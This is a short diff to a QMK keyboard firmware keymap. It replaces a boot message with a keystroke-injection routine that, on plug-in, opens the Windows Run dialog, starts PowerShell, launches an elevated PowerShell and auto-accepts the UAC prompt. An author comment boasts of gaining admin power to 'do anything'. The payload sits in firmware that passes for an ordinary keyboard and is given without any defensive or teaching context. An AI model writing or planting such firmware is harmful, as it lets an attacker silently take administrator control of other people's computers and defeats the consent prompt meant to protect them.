@@ -2,7 +2,18 @@
 #include QMK_KEYBOARD_H
 
 void keyboard_post_init_user(void) {
-    SEND_STRING("Wow is that brute force? It's doomed.\n");
+    //SEND_STRING("Wow is that brute force? It's doomed.\n");
+    SEND_STRING(SS_LGUI("r"));                              //Win + R
+    wait_ms(300);
+    SEND_STRING("powershell");                              //open powershell
+    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
+    wait_ms(300);
+    SEND_STRING("Start-Process powershell -Verb runAs");    //run powershell as admin
+    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
+    wait_ms(2000);
+    SEND_STRING(SS_TAP(X_LEFT));                            //left arrow to press yes when the admin pops up
+    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
+    //now i have admin power :) can do anything in powershell
     while(1){}
 };
 
